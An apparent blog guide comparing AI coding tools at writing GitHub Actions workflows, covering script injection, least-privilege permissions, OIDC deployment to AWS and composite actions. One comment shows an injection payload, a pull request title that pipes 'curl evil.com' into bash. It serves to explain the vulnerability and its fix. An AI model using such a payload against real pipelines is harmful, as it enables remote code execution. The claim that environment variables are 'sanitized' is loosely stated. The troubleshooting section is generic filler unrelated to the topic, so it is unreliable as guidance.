---
layout: default
title: "Best AI Tools for Writing GitHub Actions"
description: "Compare Claude Code, Copilot, and Cursor for writing GitHub Actions — security hardening, matrix builds, composite actions, and OIDC auth patterns"
date: 2026-03-22
author: theluckystrike
permalink: ai-tools-for-writing-github-actions-guide
categories: [guides]
reviewed: true
score: 8
intent-checked: true
voice-checked: true
tags: [ai-tools-compared]
---

{% raw %}

GitHub Actions YAML looks simple but has a long tail of security and reliability pitfalls: script injection via `${{ github.event.pull_request.title }}`, overly broad permissions, missing timeout settings, and cache invalidation issues. AI tools vary significantly in how well they handle these production-grade concerns.

## Key Takeaways

- **Topics covered**: the security gap, task 1: full ci pipeline with security, task 2: oidc authentication (keyless aws access)
- **Practical guidance included**: Step-by-step setup and configuration instructions
- **Use-case recommendations**: Specific guidance based on team size and requirements
- **Trade-off analysis**: Strengths and limitations of each option discussed

## Prerequisites

Before you begin, make sure you have the following ready:

- A computer running macOS, Linux, or Windows
- Terminal or command-line access
- Administrator or sudo privileges (for system-level changes)
- A stable internet connection for downloading tools


### Step 1: The Security Gap

This is where the tools diverge most. A 2026 GitHub security advisory found that script injection via `github.event` context is the #1 CI vulnerability. Only Claude consistently flags it without prompting.

```yaml
# VULNERABLE — do not use
- name: Print PR title
  run: echo "PR title: ${{ github.event.pull_request.title }}"
# An attacker can create a PR with title: "; curl evil.com | bash;"
```

Claude's correction:

```yaml
# Claude's secure version
- name: Print PR title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title: $PR_TITLE"
  # Environment variables are sanitized — no injection risk
```

### Step 2: Task 1: Full CI Pipeline with Security

**Prompt:** "Write a CI pipeline for a Python project that runs tests, checks coverage, and builds a Docker image."

**Copilot's output (simplified):**

```yaml
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: pip install -r requirements.txt
      - run: pytest
      - run: docker build -t myapp .
      - run: docker push myapp
        env:
          DOCKER_PASSWORD: ${{ secrets.DOCKER_PASSWORD }}
```

Missing: permissions, timeout, caching, and Docker credentials are handled insecurely (mixing with plaintext).

**Claude's output:**

```yaml
name: CI

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

permissions:
  contents: read        # Minimum required for checkout
  packages: write       # Only for GHCR push job
  id-token: write       # Only for OIDC-based auth

jobs:
  test:
    name: Test & Coverage
    runs-on: ubuntu-latest
    timeout-minutes: 15   # Prevent hung builds

    strategy:
      matrix:
        python-version: ['3.11', '3.12']

    steps:
      - uses: actions/checkout@v4

      - name: Set up Python ${{ matrix.python-version }}
        uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python-version }}

      - name: Cache pip packages
        uses: actions/cache@v4
        with:
          path: ~/.cache/pip
          key: ${{ runner.os }}-pip-${{ matrix.python-version }}-${{ hashFiles('requirements*.txt') }}
          restore-keys: |
            ${{ runner.os }}-pip-${{ matrix.python-version }}-

      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -r requirements.txt -r requirements-dev.txt

      - name: Run tests with coverage
        run: |
          pytest --cov=src --cov-report=xml --cov-fail-under=80 -v

      - name: Upload coverage report
        uses: codecov/codecov-action@v4
        if: matrix.python-version == '3.12'
        with:
          token: ${{ secrets.CODECOV_TOKEN }}
          fail_ci_if_error: false

  build-image:
    name: Build Docker Image
    needs: test
    runs-on: ubuntu-latest
    timeout-minutes: 20
    # Only build on main, not PRs (saves build minutes)
    if: github.ref == 'refs/heads/main'

    permissions:
      contents: read
      packages: write

    steps:
      - uses: actions/checkout@v4

      - name: Log in to GHCR
        uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}  # Built-in token, no secret needed

      - name: Extract metadata for Docker
        id: meta
        uses: docker/metadata-action@v5
        with:
          images: ghcr.io/${{ github.repository }}
          tags: |
            type=sha,prefix=sha-
            type=raw,value=latest,enable=${{ github.ref == 'refs/heads/main' }}

      - name: Build and push Docker image
        uses: docker/build-push-action@v5
        with:
          context: .
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
```

Claude added: `timeout-minutes`, `permissions` scoped to minimum required, `cache-from/to: type=gha` for Docker layer caching, and used `GITHUB_TOKEN` instead of a stored Docker password for GHCR.

### Step 3: Task 2: OIDC Authentication (Keyless AWS Access)

**Prompt:** "Write a GitHub Action that deploys to AWS using OIDC (no stored credentials)."

```yaml
# Claude's OIDC implementation
name: Deploy to AWS

on:
  push:
    branches: [main]

permissions:
  id-token: write   # Required for OIDC token request
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    environment: production  # Require manual approval for production

    steps:
      - uses: actions/checkout@v4

      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::${{ vars.AWS_ACCOUNT_ID }}:role/github-actions-deploy
          role-session-name: github-${{ github.run_id }}
          aws-region: us-east-1
          # No access keys needed — OIDC token exchanged for temporary credentials

      - name: Deploy to ECS
        run: |
          IMAGE_TAG="sha-$(git rev-parse --short HEAD)"
          aws ecs update-service \
            --cluster ${{ vars.ECS_CLUSTER }} \
            --service ${{ vars.ECS_SERVICE }} \
            --force-new-deployment \
            --region us-east-1
```

The required IAM trust policy for the OIDC role (which Claude also generates on request):

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "Federated": "arn:aws:iam::ACCOUNT_ID:oidc-provider/token.actions.githubusercontent.com"
    },
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {
        "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
        "token.actions.githubusercontent.com:sub": "repo:myorg/myrepo:ref:refs/heads/main"
      }
    }
  }]
}
```

### Step 4: Task 3: Composite Action (Reusable Steps)

**Prompt:** "Create a composite action for setting up Node.js with caching."

```yaml
# .github/actions/setup-node-cached/action.yml
name: Setup Node.js with caching
description: 'Install Node.js and cache node_modules and npm cache'

inputs:
  node-version:
    description: 'Node.js version to use'
    required: false
    default: '20'
  working-directory:
    description: 'Directory containing package.json'
    required: false
    default: '.'

outputs:
  cache-hit:
    description: 'Whether the node_modules cache was hit'
    value: ${{ steps.cache-modules.outputs.cache-hit }}

runs:
  using: composite
  steps:
    - name: Setup Node.js
      uses: actions/setup-node@v4
      with:
        node-version: ${{ inputs.node-version }}

    - name: Get package lock hash
      id: hash
      shell: bash
      run: |
        echo "lockfile-hash=$(sha256sum ${{ inputs.working-directory }}/package-lock.json | cut -d' ' -f1)" >> $GITHUB_OUTPUT

    - name: Cache node_modules
      id: cache-modules
      uses: actions/cache@v4
      with:
        path: ${{ inputs.working-directory }}/node_modules
        key: ${{ runner.os }}-node-${{ inputs.node-version }}-${{ steps.hash.outputs.lockfile-hash }}
        restore-keys: |
          ${{ runner.os }}-node-${{ inputs.node-version }}-

    - name: Install dependencies
      if: steps.cache-modules.outputs.cache-hit != 'true'
      shell: bash
      working-directory: ${{ inputs.working-directory }}
      run: npm ci --prefer-offline
```

Copilot generated a similar composite action but omitted the `outputs` section and didn't use `npm ci` (which is faster and more reliable than `npm install` in CI).

## Tool Comparison

| Pattern | Claude Code | Copilot | Cursor |
|---|---|---|---|
| Script injection prevention | Flags proactively | Misses it | Misses it |
| Permissions scoping | Minimum required | `write-all` or missing | Partial |
| OIDC auth | Correct with IAM policy | Stored credentials | Stores credentials |
| Composite actions | Full with outputs | Missing outputs | Partial |
| timeout-minutes | Always includes | Often missing | Sometimes includes |
| Docker layer caching | `type=gha` | Basic or missing | Basic |

## Troubleshooting

**Configuration changes not taking effect**

Restart the relevant service or application after making changes. Some settings require a full system reboot. Verify the configuration file path is correct and the syntax is valid.

**Permission denied errors**

Run the command with `sudo` for system-level operations, or check that your user account has the necessary permissions. On macOS, you may need to grant terminal access in System Settings > Privacy & Security.

**Connection or network-related failures**

Check your internet connection and firewall settings. If using a VPN, try disconnecting temporarily to isolate the issue. Verify that the target server or service is accessible from your network.


## Related Reading

- [Best AI Tools for Writing GitHub Actions Workflows](/ai-tools-compared/best-ai-tools-for-writing-github-actions-workflows-2026/)
- [AI Tools for Automated PR Description Generation](/ai-tools-compared/ai-tools-for-automated-pr-description-generation/)
- [Claude Code Hooks and Custom Workflows Guide](/ai-tools-compared/claude-code-hooks-and-custom-workflows-guide/)

---

Built by theluckystrike — More at [zovo.one](https://zovo.one)
{% endraw %}
